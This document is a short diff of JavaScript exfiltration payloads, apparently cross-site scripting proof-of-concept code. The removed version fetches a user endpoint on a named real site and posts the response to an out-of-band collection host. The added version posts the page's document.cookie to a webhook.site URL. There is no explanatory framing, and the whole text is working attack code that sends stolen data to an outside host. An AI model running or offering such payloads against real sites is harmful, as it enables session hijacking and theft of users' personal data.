@@ -1,7 +1,10 @@
-fetch('https://amp.pandora.com/rest/user')
-  .then(r => r.text())
-  .then(d => {
-    fetch('https://vpfdmnwru5f4imv7d815i8idjcj58eqfr.oast.site/', {method:'POST', body:d})
-      .then(() => alert('Data sent: ' + d));
-    return d;
+fetch('https://webhook.site/48e25e07-09e6-41a3-91b0-9354f5571e13', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json'
+  },
+  body: JSON.stringify({
+    data: document.cookie
   })
+})
+
